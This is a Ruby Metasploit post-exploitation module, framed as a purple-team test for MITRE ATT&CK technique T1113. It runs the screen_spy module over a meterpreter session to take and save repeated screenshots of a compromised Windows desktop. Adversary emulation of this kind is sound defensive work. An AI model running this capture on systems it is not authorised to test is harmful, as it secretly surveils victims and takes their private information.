##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Screen Capture (T1113) Windows - Purple Team',
                      'Description'   => %q{
                        Collection:
                        Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1113' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new("MODULE", [ true, "Module to execute", 'post/windows/gather/screen_spy']),
      OptInt.new('DELAY', [true, 'Interval between screenshots in seconds', 5]),
      OptInt.new('COUNT', [true, 'Number of screenshots to collect', 6]),
      OptBool.new('VIEW_SCREENSHOTS', [false, 'View screenshots automatically', false]),
      OptBool.new('RECORD', [true, 'Record all screenshots to disk by looting them', true])
    ])
  end

  def run_module(mod)
      framework_mod = framework.modules.create(mod)
      framework_mod.datastore['SESSION'] = datastore['SESSION']
      framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
      framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
      framework_mod.datastore['DELAY'] = datastore["DELAY"]
      framework_mod.datastore['COUNT'] = datastore["COUNT"]
      framework_mod.datastore['VIEW_SCREENSHOTS'] = datastore["VIEW_SCREENSHOTS"]
      framework_mod.datastore['RECORD'] = datastore["RECORD"]
      framework_mod.run_simple(
          'LocalInput' => self.user_input,
          'LocalOutput' => self.user_output,
          'RaiseExceptions' => true,
          'RunAsJob'  => false)
  end

  def run
    begin
      raise "Module requires meterpreter session" unless session.type == 'meterpreter'

      mod = datastore['MODULE']
      print_status("Executing '#{mod}' on #{session.inspect}")
      run_module(mod)

      print_good("Module T1113 execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1113W execution failed.")
    end
   end
end
